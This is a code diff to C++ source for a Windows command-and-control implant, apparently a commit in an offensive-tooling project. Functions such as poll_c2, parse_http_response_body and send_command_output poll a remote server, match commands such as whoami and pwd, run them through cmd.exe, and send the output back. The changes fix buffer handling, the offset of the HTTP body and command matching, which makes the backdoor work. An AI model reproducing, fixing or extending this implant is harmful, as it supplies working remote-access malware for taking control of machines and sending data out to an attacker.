@@ -23,7 +23,6 @@ int execute_command(
     std::string command,
     std::vector<char> command_output)
 {
-    std::vector<char> strResult;
     HANDLE hPipeRead, hPipeWrite;
 
     SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};
@@ -102,7 +101,7 @@ int execute_command(
             }
 
             buf[dwRead] = 0;
-            strResult.insert(strResult.end(), buf, buf + sizeof(buf));
+            command_output.insert(command_output.end(), buf, buf + sizeof(buf));
         }
     }
 
@@ -199,10 +198,17 @@ int poll_c2()
     printf("[+] Copying the bytes of the HTTP response in the buffer\n");
 #endif
 
-    std::vector<char> chunk(1024);
+#define CHUNK_SIZE 1024
+
+    std::vector<char> chunk(CHUNK_SIZE);
 
     while ((nDataLength = recv(client_socket, chunk.data(), chunk.size() - 1, 0)) > 0)
     {
+        if (nDataLength < CHUNK_SIZE)
+        {
+            chunk.resize(nDataLength);
+        }
+
         http_response.insert(http_response.end(), chunk.begin(), chunk.end());
     }
 
@@ -222,10 +228,10 @@ int poll_c2()
 int parse_http_response(std::vector<char> http_response)
 {
 #ifdef _DEBUG
-    printf("\n[+] HTTP Response:\n");
+    printf("[+] HTTP Response:\n");
     for (char i: http_response)
     {
-        std::cout << i;
+        std::cout << std::hex << i << std::dec;
     }
     std::cout << std::endl;
 #endif
@@ -237,12 +243,18 @@ int parse_http_response(std::vector<char> http_response)
 #endif
         return WRONG_HTTP_CODE;
     }
+    else
+    {
+#ifdef _DEBUG
+        printf("\n[+] Received a 200 OK");
+#endif        
+    }
 
     std::string double_clrf = "\r\n\r\n";
     // it will contain an iterator into the vector v where that pattern begins
     // (or v.end() if the pattern is not found).
     auto it = std::search(http_response.begin(), http_response.end(), double_clrf.begin(), double_clrf.end());
-    int http_body_index = std::distance(http_response.begin(), it);
+    int http_body_index = std::distance(http_response.begin(), it) + 4;
     char *http_body_pointer = &http_response[0] + http_body_index;
 
 #ifdef _DEBUG
@@ -289,8 +301,8 @@ int parse_http_response_body(std::vector<char> http_response, int http_body_inde
     if (std::search(
             http_response_body.begin(),
             http_response_body.end(),
-            COMMAND_PWD,
-            COMMAND_PWD + sizeof(COMMAND_PWD) - 1
+            STRINGIZE_VALUE_OF(COMMAND_PWD),
+            STRINGIZE_VALUE_OF(COMMAND_PWD) + sizeof(STRINGIZE_VALUE_OF(COMMAND_PWD)) - 1
         ) != http_response_body.end()
     )
     {
@@ -316,8 +328,8 @@ int parse_http_response_body(std::vector<char> http_response, int http_body_inde
     else if (std::search(
             http_response_body.begin(),
             http_response_body.end(),
-            COMMAND_WHOAMI,
-            COMMAND_WHOAMI + sizeof(COMMAND_WHOAMI) - 1
+            STRINGIZE_VALUE_OF(COMMAND_WHOAMI),
+            STRINGIZE_VALUE_OF(COMMAND_WHOAMI) + sizeof(STRINGIZE_VALUE_OF(COMMAND_WHOAMI)) - 1
         ) != http_response_body.end()
     )
     {
@@ -326,7 +338,23 @@ int parse_http_response_body(std::vector<char> http_response, int http_body_inde
 #endif
         std::vector<char> command_output;
         std::string command = "C:\\Windows\\System32\\cmd.exe /c whoami";
-        execute_command(command, command_output);
+        
+        if (execute_command(command, command_output) != EXIT_SUCCESS)
+        {
+#ifdef _DEBUG
+        printf("[!] Failed to execute command");
+#endif
+        }
+        
+#ifdef _DEBUG
+        printf("[+] Command output:\n");
+        for (char i: command_output)
+        {
+            std::cout << i;
+        }
+        std::cout << std::endl;
+#endif
+
         send_command_output(command_output);
     }
 
@@ -365,7 +393,7 @@ int send_command_output(std::vector<char> command_output)
     http_request.insert(http_request.end(), command_output.begin(), command_output.end());
 
 #ifdef _DEBUG
-    printf("[+] HTTP Response:\n");
+    printf("[+] HTTP Request:\n");
     for (char i: http_request)
     {
         std::cout << i;
